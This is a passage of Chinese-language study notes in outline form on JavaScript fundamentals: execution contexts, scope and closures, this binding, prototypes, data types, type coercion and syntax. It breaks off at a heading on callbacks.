函数执行上下文\r\n\r\n\t\t\t- 存在无数个，在函数被调用的时候才会被创建，每次调用函数都会创建一个新的执行上下文\r\n\r\n\t\t- Eval函数执行上下文\r\n\r\n\t\t\t- 指运行在eval函数中的代码，不建议使用\r\n\r\n\t- 执行栈也叫调用栈\r\n\r\n\t\t- 用于存储在代码执行期间创建的所有执行上下文\r\n\t\t- 首次运行会创建一个全局的执行上下文，push到当前的执行栈中，每当有函数调用，引擎都会为该函数创建一个新的函数执行上下文并push到当前执行栈的栈顶。\r\n\t\t- 栈顶函数运行完成后，会将其pop出栈，执行下一个栈顶函数\r\n\r\n\t- 执行上下文的创建\r\n\r\n\t\t- 创建阶段\r\n\r\n\t\t\t- 确定this\r\n\t\t\t- 词法环境\r\n\r\n\t\t\t\t- 环境记录\r\n\r\n\t\t\t\t\t- 存储变量和函数声明的实际位置\r\n\r\n\t\t\t\t- 对外部环境的引用\r\n\r\n\t\t\t\t\t- 可以访问的外部词法环境\r\n\r\n\t\t\t- 变量环境\r\n\r\n\t\t\t\t- 也是一个词法环境\r\n\r\n\t\t\t\t\t- 主要区别变量使用var声明、而词法环境用let、const声明\r\n\r\n\t\t- 执行阶段\r\n\r\n\t\t\t- 在进入执行上下文时会给变量对象添加形参、函数声明、变量声明等初始的属性值\r\n\t\t\t- 在代码执行阶段，会再次修改变量对象的属性值\r\n\r\n### 提升\r\n\r\n- 提升\r\n\r\n\t- 引擎会 在解释 JavaScript 代码之前首先对其进行编译。编译阶段找到所有声明,用合适的作用域将它们关联起来\r\n\t- var a = 2; 会被拆成两个阶段进行，var a （编译阶段）a=2（执行阶段），这个过程就叫作 提升\r\n\t- 一个普通块内部的函数声明通常会被提升到所在作用域的顶部\r\n\t- 每个作用域 都会进行提升操作\r\n\r\n- 函数优先\r\n\r\n\t- 函数会首先被提升,然后才是变量\r\n\r\n### 词法作用域\r\n\r\n- 词法阶段\r\n\r\n\t- 词法作用域都只由函数被声明时所处的位置决定\r\n\t- 作用域查找会在找到第一个匹配的标识符时停止（遮蔽效应）\r\n\r\n- 欺骗词法\r\n\r\n\t- 欺骗词法作用域会导致性能 下降，不是好主意\r\n\t- eval\r\n\t- with\r\n\r\n### 函数作用域和块作用域\r\n\r\n- 隐藏内部实现\r\n\r\n\t- 从所写的代码中挑选出一个任意的片段,然后用函数声明对它进行包装（隐藏代码）\r\n\t- 规避冲突：“隐藏”作用域中的变量和函数所带来的另一个好处,是可以避免同名标识符之间的冲突\r\n\t- 规避冲突方法\r\n\r\n\t\t- 命名空间\r\n\t\t- 模块管理\r\n\r\n- 函数作用域\r\n\r\n\t- 匿名函数，最熟悉的场景可能就是回调参数\r\n\r\n\t\t- 匿名函数在栈追踪中不会显示出有意义的函数名,使得调试很困难。\r\n\t\t- 如果没有函数名,当函数需要引用自身时只能使用已经 过期 的 arguments.callee 引用\r\n\t\t- 匿名函数省略了对于代码可读性 / 可理解性很重要的函数名\r\n\r\n\t- 立即执行函数表达式，IIFE\r\n\r\n\t\t- 普遍的进阶用法是把它们当作函数调用并传递参数进去\r\n\t\t- IIFE 还有一种变化的用途是倒置代码的运行顺序\r\n\r\n- 块作用域\r\n\r\n\t- with 关键字是 块作用域的一 个例子\r\n\t- try / catch 的 catch 分句会创建一个块作 用域\r\n\t-  ES6 引入了新的 let 关键字\r\n\t- ES6 还引入了 const , 同样可以用来创建块作用域变量\r\n\t- 另一个块作用域非常有用的原因和闭包及回收内存垃圾的回收机制相关\r\n\r\n### 作用域\r\n\r\n- 能够储存变量当中的值,并且能在之后对这个 值进行访问或修改\r\n- 编译原理\r\n\r\n\t- 分词/词法分析：这个过程会将由字符组成的字符串分解成(对编程语言来说)有意义的代码块\r\n\t- 解析/语法分析:将词法单元流(数组)转换成一个由元素逐级嵌套所组成的代表了程序语法\r\n结构的树(抽象语法树 AST)\r\n\t- 代码生成:将 AST 转换为可执行代码的过程称被称为代码生成\r\n\t- javascript 编译过程发生在代码执行前几微妙\r\n\t- JavaScript 引擎用尽了各种办法(比如 JIT, 可以延 迟编译甚至实施重编译)来保证性能最佳。\r\n\r\n- 作用域\r\n\r\n\t- 几个概念\r\n\r\n\t\t- 编译器\r\n\t\t- 引擎\r\n\t\t- 作用域\r\n\r\n\t- var a = 2;\r\n\r\n\t\t- 编译器会询问作用域是否已经有一个该名称的变量\r\n\r\n\t\t\t- 如果是,编译器会忽略该声明\r\n\t\t\t- 否则,要求作用域在当前集合声明一个新变量 a\r\n\r\n\t\t- 接下来编译器会为引擎生成运行时所需的代码，处理 a=2 的赋值操作\r\n\r\n\t- 引擎查找变量规则\r\n\r\n\t\t- LHS，当变量出现在赋值操作的左侧时进行LHS查询\r\n\t\t- RHS,出现在右侧时进行RHS查询\r\n\r\n\t- 作用域嵌套\r\n\r\n\t\t- 引擎从当前的执行作用域开始查找变量,如果找不到, 就向上一级继续查找\r\n\r\n### 作用域闭包\r\n\r\n- javascript 中闭包无处不在,你只需要能够识别并拥抱它\r\n- 闭包概念\r\n\r\n\t- 闭包：函数是在当前词法作用 域之外执行\r\n\t- 闭包阻止了引擎有垃圾回收器用来释放不再使用的内存空间\r\n\t- 函数不在定义词法中执行，但是依然保持对该词法的引用，这个引用叫做闭包\r\n\r\n- 模块\r\n\r\n\t- 最常见的实现模块模式的方法通常被称为 模块暴露\r\n\t- 必须有外部的封闭函数,每次调用都会创建一个新的模块 实例\r\n\t- 封闭函数必须返回至少一个内部函数\r\n\t- 大多数模块依赖加载器 / 管理器本质上都是将这种模块定义封装进一个友好的 API。\r\n\t- ES6 会将文件当作独立 的模块来处理\r\n\r\n\t\t- 每个模块都可以导入其他模块或特定的 API 成员\r\n\t\t- 同样也可以导出自己的 API 成员\r\n\r\n## this\r\n\r\n### this 的误解\r\n\r\n- 隐式传递一个对象的引用\r\n- this 在任何情况下都不指向函数的词法作用域\r\n- this 是在函数运行时，创建上下文的时候确定的\r\n\r\n### this 的绑定规则\r\n\r\n- 默认绑定\r\n\r\n\t- 使用不带任何修饰的函数引用进行调用的\r\n\r\n- 隐式绑定\r\n\r\n\t- 调用位置是否有上下文对象\r\n\t- 隐式丢失\r\n\r\n\t\t- 通常发生在对象赋值的情况\r\n\r\n- 显式绑定\r\n\r\n\t- 使用函数的 call(..) 和 apply(..) 方法\r\n\t- 硬绑定\r\n\r\n- new 绑定\r\n\r\n\t- 创建(或者说构造)一个全新的对象。\r\n\t- 这个新对象会被执行[[原型]]连接。\r\n\t- 这个新对象会绑定到函数调用的 this\r\n\t- 如果函数没有返回其他对象,那么 new 表达式中的函数调用会自动返回这个新对象\r\n\r\n### 箭头函数 this 指向\r\n\r\n- 根据外层(函数或者全局)作用域来决 定 this\r\n\r\n## 原型\r\n\r\n###   [[Prototype]]\r\n\r\n- JavaScript 中的对象有一个特殊的内置属性，是对于其他对象的引 用\r\n- 对象访问属性会触发[[Get]]操作，如果无法在本身找到需要的属性\r\n如果没有就要使用对象的 [[Prototype]] 链了\r\n- 任何可以通过原型链访问到的属性都会被枚举\r\n- 所有 普通 的 [[Prototype]] 链最终都会指向内置的 Object.prototype 。\r\n- 属性的设置（例如赋值操作）\r\n\r\n\t- 属性不存在于原型链上层，新属性会被直接添加到对象上\r\n\t- （普通访问属性）属性存在于原型链上层，创建（屏蔽属性）新属性\r\n\t- 标记为只读( writable:false )属性存在于原型链上，不会进行赋值，不发生屏蔽\r\n\t- 新属性在原型链上以setter 的形式纯在，调用 setter ，不添加新属性，不发生屏蔽\r\n\r\n### “类”\r\n\r\n- JavaScript 中 只有 对象。\r\n- “ 类 ” 函数\r\n\r\n\t- 所有的函数默认都会拥有一个 名为 prototype 的公有并且不可枚举的属性,它会指向另一个对象\r\n\t- javascript 可以创建多个对象，并将他们关联到同一个原型\r\n\t- function Foo(){...}; var a=new Foo();造成了a.[[prototype]]==Foo.prototype(实例与原型的关联)\r\n\t- javascript 和传统的面向对象的继承不太一样，不会将“类”复制到“实例”中，而是通过原型链将他们关联起来\r\n\r\n- ”构造函数“\r\n\r\n\t- Foo.prototype 默认(在代码中第一行声明时!)有一个公有并且不可枚举的属性 .constructor\r\n\t- 函数本身并不是构造函数，new 关键字，把函数变成“构造函数”\r\n\r\n- 技术\r\n\r\n\t- constructor 并不表示被构造\r\n\t- Foo.prototype.constructor === Foo;    a.constructor === Foo\r\n\r\n### （原型）继承\r\n\r\n- Object.create(..) 会凭空创建一个“新”对象并把新对象内部的 [[Prototype]] 关联到你指定的对象\r\n- 通过.__proto__ 属性修改对象关联\r\n- 判断对象是否委托关联某个函数，instanceof 操作符的左操作数是一个普通的对象,右操作数是一个函数\r\n\r\n### 对象关联\r\n\r\n- [[Prototype]] 机制就是存在于对象中的一个内部链接, 它会引用其他 对象。\r\n- var bar = Object.create( foo );  Object.create(..) 会创建一个新对象( bar )并把它关联到我们指定的对象( foo )\r\n\r\n## 数据类型\r\n\r\n### 类型\r\n\r\n- Undefined\r\n\r\n\t- 只有一个值：undefined，变量不需要显性设置为undefined值\r\n\t- undefined 指没有值(missing value)，指从未赋值\r\n\t- void 并不改变表达式的结果,只是让表达式不返回值\r\n\t- undefined 是一个内置标识符 它的值为 undefined，通过 void 运算符即可得到该值\r\n\t- 声明但未初始化的变量和未声明的变量都返回undefined\r\n\r\n- Null\r\n\r\n\t- 空对象指针，只有一个值null\r\n\t- null 指空值(empty value)，指曾赋过值,但是目前没有值\r\n\t- typeof 返回"object"，准备用于保存对象的变量初始化时最好为null\r\n\t- undefined值派生自null值，undefined==null返回true\r\n\r\n- Boolean\r\n\r\n\t- 两个字面值true和false，ECMAScript中所有类型的值都有与这两个值等价的值\r\n\t- 不同数据类型转换为Boolean\r\n\r\n\t\t- String类型：任何非空字符串可转换为true，""(空字符串)转换为false\r\n\t\t- Number：任何非零数字值可转换为true，0和NaN转换为false\r\n\t\t- Object：任何对象可转换为true，null转换为false\r\n\t\t- Undefined：n/a（not applicable，“不适用”）可转换为true，undefined可转换为false\r\n\r\n- Number\r\n\r\n\t- 数字语法\r\n\r\n\t\t- 包括“整数”和带小数的十进制数\r\n\t\t- 数字前后的 0 都可以省略\r\n\t\t- 特别大和特别小的数字默认用指数格式显示\r\n\t\t- tofixed(..) 方法可指定小数部分的显示位数\r\n\t\t- toPrecision(..) 方法用来指定 有效数位 的显示位数\r\n\t\t- 小数点是一种运算符，常见一种数字调用函数方式 42..tofixed(3)\r\n\t\t- 数字常量还可以用其他格式来表示,如二进制、八进制和十六进制\r\n\r\n\t- 较小的数值\r\n\r\n\t\t- 0.1 + 0.2 === 0.3; // false\r\n\t\t- 如何判断 0.1 + 0.2 的值是否和 0.3相等 \r\n\t\t- 最常见的方法是设置一个误差范围值, 通常称为“机器精度”\r\n\r\n\t-  整数的安全范围\r\n\r\n\t\t- 能够被“安全”呈现的最大整数是 2^53 - 1\r\n\t\t- 最小整数是 -（2^53 - 1）\r\n\t\t- 需 要 处 理 一 些 比 较 大 的 数 字，（转存）保存成字符串\r\n\r\n\t- 整数检测\r\n\r\n\t\t- 使用 ES6 中的 Number.isInteger(..) 方法\r\n\t\t- return typeof num == "number" && num % 1 == 0;\r\n\t\t- 可以使用 ES6 中的 Number.isSafeInteger(..)\r\n\t\t- return Number.isInteger( num ) && Math.abs( num ) <= Number.MAX_SAFE_INTEGER;\r\n\r\n\t- 32 位有符号整数\r\n\r\n\t\t- 是有些数字操作(如数位操作)只适用于 32 位数字\r\n\r\n\t- 整数\r\n\r\n\t\t- 进制表示格式\r\n\r\n\t\t\t- 十进制\r\n\t\t\t- 八进制字面值第一位为0，然后是八进制数字序列（0~7）\r\n\t\t\t- 十六进制前两位为0x，后面跟十六进制数字（0~f），字母大小写都可以\r\n\r\n\t\t- 进行算术计算时所有以八进制和十六进制表示的数值都将被转换为十进制\r\n\r\n\t- 浮点数值\r\n\r\n\t\t- 浮点数值必须有一个小数点，小数点后必须有至少一位小数，最高精度是17位小数\r\n\t\t- e表示法（科学记数法）：3.125e7=3.125*10^7=31250000\r\n\t\t- 浮点数值计算会产生舍入误差如0.1+0.2=0.30000000000000004不等于0.3，所以不要用特定浮点数值进行测试\r\n\r\n\t- NaN（非数值）\r\n\r\n\t\t- 表示一个本来要返回数值的操作数未返回数值的情况\r\n\t\t- 任何涉及NaN的操作都会返回NaN，同时NaN与任何数值包括自身都不相等（NaN==NaN返回false）\r\n\t\t- isNaN()函数：接收一个值后，尝试将其转换为数值。不能被转换为数值的值会导致这个函数返回true\r\n\r\n\t- 无穷数 Infinity\r\n\t- 零值\r\n\r\n\t\t- JavaScript 有一个常规的 0 (也叫作 +0 )和一个 -0\r\n\r\n\t- 特殊等式\r\n\r\n\t\t- NaN 和自身不相等\r\n\t\t- -0 等于 0\r\n\t\t- ES6中新加入了一个工具方法 Object.is(..) 来判断两个值是否绝对相等\r\n\r\n\t- 数值转换函数\r\n\r\n\t\t- parseInt()\r\n\t\t- Number()\r\n\t\t- parseFloat()\r\n\r\n- String\r\n\r\n\t- 以引号（单双引号都可以但是要配对）表示\r\n\t- 字符串一旦创建，值就不可变\r\n\t- 字符串和数组的确很相似,它们都是类数组\r\n\t- JavaScript 中字符串是不可变的, 而数组是可变的\r\n\t- 通过“借用”数 组的非变更方法来处理字符串\r\n\t- 转换为字符串\r\n\r\n\t\t- toString()方法，适用于数值、布尔值、对象和字符串值\r\n\r\n\t\t\t- 调用数值的toString()方法时可以传递一个参数，来输出以二进制、八进制等进制格式表示的字符串\r\n\r\n- 数组\r\n\r\n\t- 数组可以容纳任何类型的值\r\n\t- 使用delete删除数组内容，但是数组的长度不会变化\r\n\t- 字符串键值能够被强制类型转换为十进制数字的话,它 就会被当作数字索引来处理\r\n\t- 有时需要将类数组转换为真正的数组\r\n\r\n- symbol（es6 新增）\r\n\r\n### 引用类型（对象定义）\r\n\r\n- Object类型 \r\n\r\n\t- 创建方法\r\n\r\n\t\t- 使用new操作符跟Object构造函数\r\n\r\n\t\t\t- var person=new Object(); person.name="Nick"; person.age=29;\r\n\r\n\t\t- 对象字面量表示法\r\n\r\n\t\t\t- var person={ name: "Nick", age:29}; 花括号内可以为空，属性名可以使用字符串如"name": "Nick"\r\n\r\n\t- 对象的内容（属性）\r\n\r\n\t\t- 对象的内容（属性）\r\n\t\t- 属性名永远都是字符串。\r\n\t\t- 对象的“方法”：对函数的一种引用\r\n\t\t- 复制对象\r\n\r\n\t\t\t- 深拷贝\r\n\t\t\t- 浅拷贝\r\n\r\n\t\t- 属性描述符\r\n\r\n\t\t\t- writable (可写)\r\n\t\t\t- enumerable (可枚举)\r\n\t\t\t- configurable (可配置)\r\n\r\n\t\t-   [[Get]]\r\n\r\n\t\t\t-  myObject.a 在 myObject 上实际上是实现了 [[Get]] 操作\r\n\r\n\t\t-   [[Put]]\r\n\r\n\t\t\t- 并非在赋值的时候触发，具体逻辑在原型链里做分析\r\n\r\n\t\t- 使用 getter 和 setter 部分改写默认操作（运用在单个属性上）\r\n\r\n\t\t\t- getter 是一个隐藏函数,会在获取属性值时调用\r\n\t\t\t- setter 也是一个隐藏 函数,会在设置属性值时调用\r\n\r\n\t\t- hasOwnProperty(..) 方法检查属性是否存在\r\n\t\t- 不可变\r\n\r\n\t\t\t- Object.seal(..)\r\n\t\t\t- Object.preventExtensions(..)\r\n\t\t\t- Object.freeze(..)\r\n\r\n\t\t- 属性遍历\r\n\r\n\t- 访问方法\r\n\r\n\t\t- 点表示法 person.name\r\n\t\t- 属性名中包含易导致语法错误的字符或使用变量时可以用方括号表示法 person["first name"]\r\n\r\n- Array类型\r\n\r\n\t- 数组的每一项可以保存任何类型的数据\r\n\t- 创建方法\r\n\r\n\t\t- 使用Array构造函数\r\n\r\n\t\t\t- var colors= new Array(); new操作符可省略，可以给构造函数传递要保存的项目数量，该数量会自动成为length属性的值\r\n\r\n\t\t- 数组字面量表示法\r\n\r\n\t\t\t- var colors=["red", "blue", "green" ]\r\n\r\n\t- 数组的length属性可以修改，通过设置这个属性可以从数组末尾移除或添加项\r\n\r\n\t\t- 利用length属性的值也可以方便地添加新项，因为数组最后一项的索引始终是length-1\r\n\t\t- var colors=["red", "blue", "green" ]; colors[colors.length]= "black"; colors[colors.length]= "brown";\r\n\r\n\t- 检测方法\r\n\r\n\t\t- Array.isArray()\r\n\t\t- instanceof只适用于一个全局执行环境\r\n\r\n\t- 转换方法\r\n\r\n\t\t- toLocaleString()/toString()/valueOf()\r\n\r\n\t- 栈方法（Last-In-First-Out后进先出）\r\n\r\n\t\t- push()方法：接受任意数量的参数，逐个添加到数组末尾并返回修改后的数组长度\r\n\t\t- pop()方法：从数组末尾移除最后一项，减少数组的length值并返回移除的项\r\n\r\n\t- 队列方法FIFO（先进先出）\r\n\r\n\t\t- shift()方法：移除数组中的第一个项，减少数组长度并返回移除的项\r\n\t\t- shift()方法和push()方法合用可以像使用队列一样使用数组\r\n\t\t- unshift()方法：在数组前端添加任意个项并返回数组的length\r\n\t\t- unshift()方法与pop()方法合用可以从反方向模拟队列\r\n\r\n\t- 重排序方法\r\n\r\n\t\t- reverse()方法：反转数组项的顺序\r\n\t\t- sort()方法：按升序排列数组项\r\n\r\n\t\t\t- 通过调用每个数组项的toString()方法来比较得到的字符串，很多情况下不符合要求\r\n\t\t\t- 可以接收一个比较函数作为参数，方便指定数组项排序\r\n\r\n\t- 操作方法\r\n\r\n\t\t- contact()方法基于当前数组所有项创建一个新数组\r\n\r\n\t\t\t- var colors2=colors1.concat("yellow", ["black", "brown"]); 返回新构建的数组\r\n\r\n\t\t- slice()方法基于当前数组的一个或多个项创建一个新数组\r\n\r\n\t\t\t- var colors2=colors1.slice(1);一个参数情况下返回该参数指定位置到当前数组末尾所有项\r\n\t\t\t-  var colors3=colors1.slice(1, 4); 两个参数情况下返回起始位置和结束位置之间的项，不包括结束位置的项\r\n\r\n\t\t- splice()方法\r\n\r\n\t\t\t- 删除\r\n\r\n\t\t\t\t- 指定2个参数：要删除的第一项的位置和要删除的项数，删除任意数量的项\r\n\r\n\t\t\t\t\t- .splice(1, 4);\r\n\r\n\t\t\t- 插入\r\n\r\n\t\t\t\t- 指定3个参数：起始位置、0（要删除的项数）、要插入的项\r\n\r\n\t\t\t\t\t- .splice(2, 0, "yellow", "orange");\r\n\r\n\t\t\t- 替换\r\n\r\n\t\t\t\t- 指定3个参数：起始位置、要删除的项数、要插入的项\r\n\r\n\t- 位置方法\r\n\r\n\t\t- indexOf()方法\r\n\r\n\t\t\t- 接收两个参数，分别表示要检索的项和索引起始位置\r\n\r\n\t\t- LastindexOf()方法\r\n\r\n\t\t\t- 同上\r\n\r\n\t- 迭代方法\r\n\r\n\t\t- every()\r\n\t\t- filter()\r\n\t\t- forEach()\r\n\t\t- map()\r\n\t\t- some()\r\n\r\n\t- 归并方法\r\n\r\n- Date类型\r\n\r\n\t- 创建方法\r\n\r\n\t\t- 使用new操作符和Date构造函数\r\n\r\n\t\t\t- var now= new Date();\r\n\t\t\t- 传参数的方法\r\n\r\n\t\t\t\t- Date.parse()方法\r\n\r\n\t\t\t\t\t- 接受一个表示日期的字符串，尝试根据字符串返回相应日期的毫秒数，未定义支持的日期格式\r\n\t\t\t\t\t- var someDate= new Date(Date.parse("May 25, 2004")); 如字符串不能表示日期，返回NaN\r\n\t\t\t\t\t- var someDate=new Date("May 25, 2004);直接将表示日期的字符串传给Date函数会在后台直接调用Date.parse()方法\r\n\r\n\t\t\t\t- Date.UTC()方法\r\n\r\n\t\t\t\t\t- var someDate=new Date(Date.UTC(2005,4,5,17,55,55));\r\n\t\t\t\t\t- 参数分别是年、月、日、小时、分钟、秒、毫秒等，其中月份从0开始\r\n\t\t\t\t\t- 也可以直接将表示日期的字符串传给Date函数\r\n\r\n\t\t- Date.now()返回表示调用这个函数的日期和时间\r\n\r\n### 值和类型\r\n\r\n- JavaScript 中的变量是没有类型的, 只有值才有\r\n- 变量可以随时持有任何类型的值\r\n- undefi ned 和 undeclared\r\n\r\n\t- 变量在未持有值的时候为 undefined\r\n\t- 还没有在作用域中声明 过的变量,是 undeclared 的\r\n\t- “undefined”和“is not defined”是两码事\r\n\r\n-   typeof  Undeclared\r\n\r\n\t- 会检查变量是否已被声明\r\n\t- 访问不存在的对象属性不会产生 ReferenceError 错误\r\n\r\n## 原生函数\r\n\r\n### 常用的原生函数有\r\n\r\n- String()\r\n- Number()\r\n- Boolean()\r\n- Array()\r\n- Object()\r\n- Function()\r\n- RegExp()\r\n- Date()\r\n- Error()\r\n- Symbol()——ES6 中新加入的!\r\n\r\n### 内部属性[[class]]\r\n\r\n- 所有 typeof 返回值为 "object" 的对象(如数组)都包含一个内部属性 [[Class]]\r\n\r\n### 封装对象包装\r\n\r\n- 基 本 类 型 值 没 有 .length 和 .toString() 这样的属性和方法,需要通过封装对象才能访问\r\n- 封装对象释疑  !new Boolean( false ) //false\r\n\r\n### 拆封\r\n\r\n- 如果想要得到封装对象中的基本类型值,可以使用 valueOf() 函数\r\n\r\n### 原生函数作为构造函数\r\n\r\n-   Array(..)\r\n\r\n\t- Array 构造函数只带一个数字参数的时候,该参数会被作为数组的预设长度\r\n\t- 包含至少一个“空单元”的数组称为“稀疏数组”\r\n\t- 可以通过 delete b[1] 在数组 b 中制造出一个空单元\r\n\t- 永远不要 创建和使用空单元数组\r\n\r\n- Object(..)、Function(..) 和 RegExp(..)\r\n\r\n\t- 尽量不要使用 Object(..) / Function(..) / RegExp(..)\r\n\t- 使用 new Object() 来创建对象,必须逐一设置属性\r\n\t- 构造函数 Function 只在极少数情况下很有用,比如动态定义函数参数和函数体的时候\r\n\t- 强烈建议使用常量形式(如 /^a*b+/g )来定义正则表达式\r\n\r\n- Date(..) 和 Error(..)\r\n\r\n\t- Date(..) 可以带参数,用来指定日期和时间,而不带 参数的话则使用当前的日期和时间。\r\n\t- 创建错误对象(error object)主要是为了获得当前运行栈的上下文\r\n\r\n- Symbol(..)\r\n\r\n\t- 符号是具有唯一性的特殊值(并 非绝对),用它来命名对象属性不容易导致重名\r\n\t- 不能带 new 关键 字,否则会出错:\r\n\r\n- 原生原型\r\n\r\n\t- 原生构造函数有自己的 .prototype 对象,如 Array.prototype 、 String.prototype 等\r\n\t- 将原型作为默认值，例如：, RegExp.prototype 是一个“空”的正则表达式\r\n\r\n## 强制类型转换\r\n\r\n### 值类型转换\r\n\r\n- 将值从一种类型转换为另一种类型通常称为 类型转换（显示）\r\n\r\n\t- 类型转换发生在静态类型语言的编译阶段\r\n\r\n- 隐式的情况称为 强制类型转换\r\n\r\n\t- 强制类型转换则发生在动态类型语言的运行时\r\n\r\n### 抽象值操作\r\n\r\n- ToString\r\n\r\n\t- 它负责处理非字符串到字符串的强制类型转换\r\n\t- 对普通对象来说, 除非自行定义, 否则 toString() ( Object.prototype.toString() )返回 内部 属性 [[Class]] 的值\r\n\t- 数组的默认 toString() 方法经过了重新定义, 将所有单元字符串化以后再用 "," 连接起 来\r\n\t- 工具函数 JSON.stringify(..) 在将JSON对象序列化为字符串时也用到了 ToString\r\n\t- JSON.stringify(..) 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则返回 null\r\n\t- toJSON() 应该“返回一个能够被字符串化的安全的 JSON 值”, 而不是“返回 一个 JSON 字符串”\r\n\t- 字符串、数字、布尔值和 null 的 JSON.stringify(..) 规则与 ToString 基本相同\r\n\t- 如果传递给 JSON.stringify(..) 的对象中定义了 toJSON() 方法, 那么该方法会在字符 串化前调用,以便将对象转换为安全的 JSON 值\r\n\r\n- ToNumber\r\n\r\n\t- 对象(包括数组)会首先被转换为相应的基本类型值\r\n\t- 处理失败 时返回 NaN\r\n\t- 检查该值是否有 valueOf() 方法\r\n\r\n\t\t- 如果有\r\n\r\n\t\t\t- 使用该值进行强制类型转换\r\n\r\n\t\t- 如果没有\r\n\r\n\t\t\t- 使用 toString() 的返回值(如果存在)来进行强制类型转换。\r\n\r\n- ToBoolean\r\n\r\n\t- 可以被强制类型转换为 false 的值\r\n\t- 其他(被强制类型转换为 true 的值)\r\n\t- 假值\r\n\r\n\t\t- undefined\r\n\t\t- null\r\n\t\t- false\r\n\t\t- +0、-0和 NaN\r\n\t\t- “ ”\r\n\r\n\t- 假值对象\r\n\r\n\t\t- document.all \r\n\r\n\t- 真值\r\n\r\n\t\t- 假值列表之外的值\r\n\r\n### 显式强制类型转换\r\n\r\n- 字符串和数字之间转换\r\n\r\n\t- 日期显式转换为数字\r\n\r\n\t\t- +new Date();\r\n\r\n\t- 奇特的 ~ 运算符\r\n\r\n\t\t- 字位运算符(如 | 和 ~ )和某些特殊数字一起使用时会产生\r\n类似强制类型转换的效果\r\n\r\n\t- 字位截除\r\n\r\n\t\t- 使用 ~~ 来截除数字值的小数部分\r\n\r\n- 显式解析数字字符串\r\n\r\n\t- 解析非字符串\r\n\r\n\t\t- parseInt(..) 会根据字符串的第一个字符来自行决定基数\r\n\r\n- 显式转换为布尔值\r\n\r\n\t- 三元运算符\r\n\t- if 判断\r\n\t- ！！强制转换\r\n\r\n### 隐式强制类型转换\r\n\r\n- 隐式地简化\r\n\r\n\t- 隐式强制类 型转换同样可以用来提高代码可读性\r\n\r\n- 字符串和数字之间的隐式强制类型转换\r\n\r\n\t- 根据 ToPrimitive 抽象操作规则, a + "" 会对 a 调用 valueOf() 方法,然后通过 ToString 抽象 操作将返回值转换为字符串\r\n\t- - 是数字减法运算符,因此 “3.14” - 0 会将 “3.14” 强制类型转换为数字。\r\n\r\n- 布尔值到数字的隐式强制类型转换\r\n\r\n\t- 复杂的布尔逻辑转换为数字加法\r\n\r\n-  隐式强制类型转换为布尔值\r\n\r\n\t- if (..)\r\n\t- for ( .. ; .. ; .. )\r\n\t- while (..) 和 do..while(..)\r\n\t- ? :\r\n\t- 逻辑运算符 || (逻辑或)和 && (逻辑与)左边的操作数\r\n\r\n- || 和 &&\r\n- 符号的强制类型转换\r\n\r\n\t- 从符号到字符串的 显式 强制类型转换,然而 隐式 强制类型转换会产生错误\r\n\r\n### 宽松相等和严格相等\r\n\r\n- == 允许在相等比较中进行强制类型转换,而 === 不允许\r\n- 相等比较操作的性能\r\n\r\n\t- 然强制类型转换确实要多花点时间, 但仅仅是微秒级 (百万分之一秒)的差别而已\r\n\r\n- 抽象相等\r\n\r\n\t- NaN 不等于NaN\r\n\t- +0 等于-0\r\n\t- == 在比较两个不同类型的值时会发生 隐式 强制类型转换\r\n\t- true 和 false 与其他类型之间的相等比较\r\n\t- == 对不同的类型组合处理方式不同 \r\n\t- 在 == 中 null 和 undefined 相等\r\n\t- 对象和非对象之间的相等比较\r\n\r\n\t\t- 对对象调用 ToPromitive 抽象操作，拆分封装对象\r\n\r\n-  比较少见的情况\r\n\r\n\t- 返回其他数字\r\n\t- 假值的相等比较\r\n\t- 极端情况\r\n\t- 完整性检查\r\n\t- 安全运用隐式强制类型转换\r\n\r\n### 抽象关系比较\r\n\r\n- 比较双方都是字符串\r\n\r\n\t- 则按字母顺序来进行比较\r\n\r\n- 和其他情况\r\n\r\n\t- 比较双方首先调用 ToPrimitive ,如果结果出现非字符串,就根据 ToNumber 规则将双方强 制类型转换为数字来进行比较。\r\n\r\n- 相等比较有严格相等,关系比较却没有“严格关系比较”\r\n\r\n## 语法\r\n\r\n### 语句和表达式\r\n\r\n- 语句相当于句子, 表达式相当于短语\r\n- var b = a 称为“声明语句”\r\n- b = a (不带 var )叫作“赋值表达式”\r\n- 语句的结果值\r\n\r\n\t- 在控制台中输入 var a = 42 会得到结果值 undefined\r\n\t- 代码中是没有办法获得这个结果值\r\n\t- 代码块，返回最后一条语句的结果值\r\n\t- 多个赋值语句串联时 ,赋值表达式(和语句)的结果值就 能派上用场\r\n\r\n- 表达式副作用\r\n\r\n\t- 递增运算符 ++ 和递减运算符 -- 都是一元运算符\r\n\t- ++a++ 会产生 ReferenceError 错误, 因为运算符需要将产生的副作用赋值给 一个变量\r\n\r\n- 上下文规则\r\n\r\n\t- 大括号\r\n\t- 代码块\r\n\t- 对象解构\r\n\t- else if 和可选代码块\r\n\r\n### 运算符优先级\r\n\r\n- 短路\r\n\r\n\t- && 和 || 运算符的“短路”\r\n\t- 如果从左边的操作数能够得出结果,就可以忽略右边的操作数\r\n\r\n- 更强的绑定\r\n\r\n\t- a && b || c ? c || b ? a : c && b : a\r\n\r\n- 关联\r\n- 释疑\r\n\r\n\t- 编写程序时要将两者结合起来,既要依赖运算符 优先级 关联规则\r\n\t- 也要适当使用 ( ) 自行控制方式\r\n\r\n### 自动分号\r\n\r\n- 有时 JavaScript 会自动为代码行补上缺失的分号, 即自动分号插入\r\n- , ASI 只在换行符处起作用,而不会在代码行的中间插入分号\r\n- ASI 实际上是一个“纠错”(error correction)机制\r\n- 建议在所有需要的地方加上分号,将对 ASI  的依赖降到最低\r\n\r\n### 错误\r\n\r\n- 在编译阶段发现的代码错误叫作“早期错误”\r\n- 这些错误在代码执行之前是无法用 try..catch 来捕获的，还会导致解析/编译 失败。\r\n- 非法正则产生早期错误\r\n- 语法规定赋值对象必须是一个标识符\r\n- 严格模式中,函数的参数不能重名\r\n- ES6 规范定义了一个新概念,暂时性死区\r\n\r\n### 函数参数\r\n\r\n- 在 ES6 中,如果参数被省略或者值为 undefined ,则取该参数的默认值\r\n- 如果向参数传递 undefined ，会出现一个undefined 单元，而不是默认值\r\n- 向函数传递参数时, arguments 数组中的对应单元会和命名参数建立关联\r\n\r\n### try..finally\r\n\r\n- finally 中的代码总是会在 try 之后执行,如果有 catch 的话则在 catch 之后执行\r\n- try 中的 return ，函数执行完毕后悔将函数的返回值设置为 return 的值\r\n- 如果 finally 中抛出异常(无论是有意还是无意),函数就会在此处终止\r\n\r\n###   switch\r\n\r\n- 可以把它看作 if..else if..else.. 的简化版本\r\n\r\n## 回调\r\n\r\n### 　continuation\r\n\r\n- 